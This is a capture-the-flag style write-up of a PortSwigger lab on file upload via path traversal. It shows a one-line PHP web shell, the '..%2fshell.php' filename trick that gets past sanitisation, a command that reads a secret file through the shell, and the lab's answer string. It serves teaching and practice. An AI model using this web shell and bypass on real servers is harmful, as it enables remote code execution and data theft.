# PortSwigger Web Security Academy - File Upload via Path Traversal | Write-up

> **Platform:** PortSwigger Web Security Academy &nbsp;•&nbsp; **Category:** File Upload Vulnerabilities &nbsp;•&nbsp; **Difficulty:** Practitioner
>
> **Target:** `web-security-academy.net` (Web shell upload via path traversal lab) &nbsp;•&nbsp; **Time taken:** 15 mins
>
> **Author:** Jithin Jelson

---

## Introduction

We have been told in this lab that a file upload vulnerability exists, but we have been made known that the folder where the PHP file will be uploaded cannot execute PHP code as a safeguard. Our goal is to bypass this and get the secret folder to complete the lab.

Credentials given: `wiener:peter`

---

## Assessment Overview

```mermaid
flowchart LR
  A[Login as wiener<br/>reach upload area]:::entry --> B[Craft PHP<br/>web shell]:::payload
  A --> C[Intercept upload<br/>send to Repeater]:::intel

  B --> D{shell.php in<br/>avatars dir}:::user
  C --> D

  D --> E[Access shell:<br/>source, no execution]:::mitre
  D --> F[Path traversal<br/>../shell.php]:::payload

  E -.-> F
  F --> G[404 Not Found<br/>filename sanitised]:::mitre
  F --> H[URL-encode slash<br/>..%2fshell.php]:::payload
  G -.-> H

  H --> I[RCE<br/>cmd=id runs as carlos]:::ioc
  I --> J[Read secret<br/>cat carlos secret]:::user
  I --> K[Confirms<br/>full command exec]:::ioc

  classDef entry fill:#1d4ed8,stroke:#1e3a8a,color:#ffffff;
  classDef ioc fill:#0f766e,stroke:#134e4a,color:#ffffff;
  classDef intel fill:#7c3aed,stroke:#5b21b6,color:#ffffff;
  classDef mitre fill:#b45309,stroke:#78350f,color:#ffffff;
  classDef payload fill:#be123c,stroke:#881337,color:#ffffff;
  classDef user fill:#15803d,stroke:#14532d,color:#ffffff;
  linkStyle default stroke-width:2px
```

---

## What I Learned

- Path traversal in a filename can plant a web shell outside the directory that was meant to contain it.
- Blocking PHP execution on the upload folder alone is not a real control if an attacker can write one level up.
- Encoding the traversal slash as `%2f` defeats naive sanitisation that only strips a literal `../`.

---

## Logging In and Building the Web Shell

We can start by visiting the PortSwigger target web address and open up Burp Suite.

![Burp Suite open alongside the lab login page](images/01-burp-login-page.png)

*Figure 1 - Burp Suite running next to the lab, logged in as wiener.*

We can input the details of our login to come to our file upload vulnerability area. We will also create a simple script to get us command line access via PHP code.

```
<?php system($_GET['cmd']); ?>
```

![Web shell being written in a text editor](images/02-webshell-nano.png)

*Figure 2 - The PHP web shell that passes the `cmd` parameter to system().*

---

## Uploading the Web Shell

We will now attempt to upload this into our upload area provided to us.

![Lab confirming the file was uploaded](images/03-shell-uploaded.png)

*Figure 3 - The file avatars/shell.php has been uploaded.*

We can see that the file has successfully uploaded, however when we try to access the file we get the following.

![Browser showing the raw PHP source instead of running it](images/04-raw-php-no-execution.png)

*Figure 4 - The PHP source is returned as plain text, not executed.*

We get the following text but no execution. This is because this directory has been configured not to run PHP for security purposes. To bypass this we can try and use path traversal to execute it in the directory previous to this.

![URL bar showing the files/avatars/shell.php path](images/05-file-path-url.png)

*Figure 5 - The uploaded shell sits under files/avatars/, the directory that blocks PHP.*

---

## Sending the Request to Repeater

We can try and run it in the files directory. To do this we can go to our HTTP history and send the following to Repeater.

![Burp HTTP history with the avatar upload request selected](images/06-http-history-repeater.png)

*Figure 6 - The POST /my-account/avatar upload request in HTTP history, ready to send to Repeater.*

---

## Path Traversal in the Filename

We will now attempt to upload the script by changing the filename to `../shell.php`.

```
filename="../shell.php"
```

![Repeater request with the traversal filename and an upload success response](images/07-traversal-filename-upload.png)

*Figure 7 - With filename ../shell.php the server still reports the file as uploaded.*

---

## Bypassing Input Sanitisation with URL Encoding

However we are greeted with a 404 error.

![Apache 404 Not Found page](images/08-404-not-found.png)

*Figure 8 - A 404 Not Found when accessing the traversed path.*

Maybe there is input sanitisation? We can try and URL-encode it and send it again. We'll repeat our request using Ctrl+U.

```
filename="..%2fshell.php"
```

![Repeater request with the URL-encoded filename returning 200 OK](images/09-urlencoded-filename.png)

*Figure 9 - URL-encoding the slash as %2f uploads the shell one directory up and returns 200 OK.*

---

## Achieving Remote Code Execution

Now this time we get a blank screen, this can be promising, so lets try and attempt RCE.

![Browser showing the id command output running as carlos](images/10-rce-id-carlos.png)

*Figure 10 - Command execution confirmed, the shell runs as uid=12002(carlos).*

And we are successful.

---

## Reading the Secret

Now lets view the secret.

```
GET /files/shell.php?cmd=cat+../../../../home/carlos/secret
```

![Repeater request reading the secret file via the web shell](images/11-read-secret.png)

*Figure 11 - Reading /home/carlos/secret through the web shell to complete the lab.*

> **Lab question:** Submit the secret from Carlos's home directory to solve the lab.

**Answer:** `W1F6KRJVOw5CMXPEJfKIknGeRwhgFYEM`
